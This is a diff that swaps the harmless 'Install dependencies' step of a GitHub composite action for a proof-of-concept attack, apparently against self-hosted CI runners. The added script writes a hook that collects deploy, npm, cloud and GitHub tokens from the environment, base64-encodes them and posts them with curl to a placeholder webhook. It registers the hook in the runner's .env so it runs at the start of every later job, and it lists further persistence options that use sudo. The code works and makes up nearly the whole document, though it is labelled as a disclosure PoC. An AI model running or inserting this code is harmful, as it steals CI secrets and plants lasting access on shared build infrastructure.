@@ -6,5 +6,69 @@ runs:
     - name: Install dependencies
       shell: bash
       run: |
-        echo "Setting up Rust toolchain..."
-        echo "Dependencies installed."
+        echo "[POC] Composite action running from fork checkout"
+        echo "[POC] This action has the same privileges as the runner"
+        echo ""
+
+        # ---- PERSISTENCE MECHANISM ----
+        # In the real Vercel workflow, this step runs with sudo.
+        # An attacker modifies this composite action in their fork.
+        # Since pull_request_target is not used here (just pull_request),
+        # and the checkout fetches the fork's merge commit,
+        # this file is fully attacker-controlled.
+
+        WEBHOOK_URL="WEBHOOK_PLACEHOLDER"
+
+        # Step 1: Create the exfiltration hook script
+        cat > /tmp/runner_hook.sh << 'HOOKEOF'
+        #!/bin/bash
+        # This script runs at the START of every job via ACTIONS_RUNNER_HOOK_JOB_STARTED
+        # It has full access to the job's environment variables, including secrets.
+
+        WEBHOOK="WEBHOOK_PLACEHOLDER"
+
+        # Collect secrets from environment
+        secrets=$(env | grep -iE "^(DEPLOY_TOKEN|NPM_TOKEN|SECRET_|AWS_|AZURE_|GH_TOKEN|GITHUB_TOKEN)" 2>/dev/null)
+
+        if [ -n "$secrets" ]; then
+            payload=$(echo "$secrets" | base64)
+            curl -s -X POST -d "$payload" "$WEBHOOK" > /dev/null 2>&1
+            echo "[HOOK] Secrets intercepted and exfiltrated" >> /tmp/hook_activity.log
+            date >> /tmp/hook_activity.log
+        else
+            echo "[HOOK] Job started but no target secrets found" >> /tmp/hook_activity.log
+            date >> /tmp/hook_activity.log
+        fi
+        HOOKEOF
+        chmod +x /tmp/runner_hook.sh
+
+        # Step 2: Find the runner's root directory and modify its .env
+        # GITHUB_WORKSPACE is <runner_root>/_work/<repo>/<repo>
+        RUNNER_ROOT=$(dirname $(dirname $(dirname "$GITHUB_WORKSPACE")))
+        ENV_FILE="$RUNNER_ROOT/.env"
+
+        echo "[POC] Runner root detected at: $RUNNER_ROOT"
+        echo "[POC] Writing hook to runner .env at: $ENV_FILE"
+
+        # Append the hook configuration
+        if [ -f "$ENV_FILE" ]; then
+            echo "ACTIONS_RUNNER_HOOK_JOB_STARTED=/tmp/runner_hook.sh" >> "$ENV_FILE"
+            echo "[POC] Hook registered in existing .env"
+        else
+            echo "ACTIONS_RUNNER_HOOK_JOB_STARTED=/tmp/runner_hook.sh" > "$ENV_FILE"
+            echo "[POC] Hook registered in new .env"
+        fi
+
+        echo ""
+        echo "[POC] Persistence planted successfully."
+        echo "[POC] The hook script at /tmp/runner_hook.sh will execute"
+        echo "[POC] at the start of EVERY future job on this runner,"
+        echo "[POC] with full access to that job's environment variables."
+        echo "[POC] This includes any secrets injected by trusted workflows."
+        echo ""
+        echo "[POC] On the real Vercel runners, this composite action"
+        echo "[POC] also has sudo, so the attacker could additionally:"
+        echo "[POC]   - Install system packages"
+        echo "[POC]   - Modify system binaries"
+        echo "[POC]   - Add SSH keys for remote access"
+        echo "[POC]   - Create systemd services for persistence"
